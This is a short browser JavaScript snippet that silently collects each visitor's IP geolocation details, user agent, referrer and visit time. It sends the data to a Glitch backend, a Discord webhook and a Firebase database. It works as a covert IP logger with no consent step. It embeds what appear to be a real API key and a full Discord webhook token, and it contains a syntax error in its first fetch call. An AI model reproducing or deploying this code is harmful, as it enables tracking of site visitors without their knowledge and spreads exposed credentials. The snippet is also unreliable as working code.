// Fetch IP details from Abstract API
fetch("https://app.abstractapi.com/q", {
    method: "GET",
    headers: {
        "X-API-KEY": "577cf8161d6e494bb7fb0df8e0b9102e",
})
    .then(response => response.json())
    .then(ipData => {
        // Collect user information
        const userInformation = {
            date: new Date(),
            day: new Intl.DateTimeFormat('en-US', { weekday: 'long' }).format(new Date()),
            time: new Intl.DateTimeFormat('en-US', { timeStyle: 'short' }).format(new Date()),
            referringURL: document.referrer,
            userAgent: navigator.userAgent,
        };

        // Combine IP and user data
        const combinedData = {
            ipDetails: ipData,
            userInfo: userInformation,
        };

        // Send combined data to your Node.js backend
        postDataToBackend(combinedData);

        // Send data to Discord webhook
        sendToDiscord(combinedData);

        // Send data to Firebase database
        sendToFirebase(combinedData);
    })
    .catch(error => console.error("Error fetching IP details: ", error));

function postDataToBackend(data) {
    
    fetch('https://gratis-jeweled-eyelash.glitch.me/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => response.json())
    .then(responseData => console.log('Data sent to backend:', responseData))
    .catch(error => console.error('Error sending data to backend:', error));
}

function sendToDiscord(data) {
    // Implement sending data to a Discord webhook
    // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT';

    // Create a message and send it to Discord
    const message = `Combined Data: \n\`\`\`${JSON.stringify(data, null, 2)}\`\`\``;

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message }),
    })
    .then(response => response.json())
    .then(responseData => console.log('Data sent to Discord:', responseData))
    .catch(error => console.error('Error sending data to Discord:', error));
}

function sendToFirebase(data) {
    // Implement sending data to Firebase database
    // Initialize Firebase with your project's config (as shown in the previous response)

    // Use the Firebase JavaScript SDK to send data to your Firebase database
    const db = firebase.database();
    const ref = db.ref("combined_data");
    
    ref.push(data, (error) => {
        if (error) {
            console.error('Error sending data to Firebase:', error);
        } else {
            console.log('Data sent to Firebase');
        }
    });
}
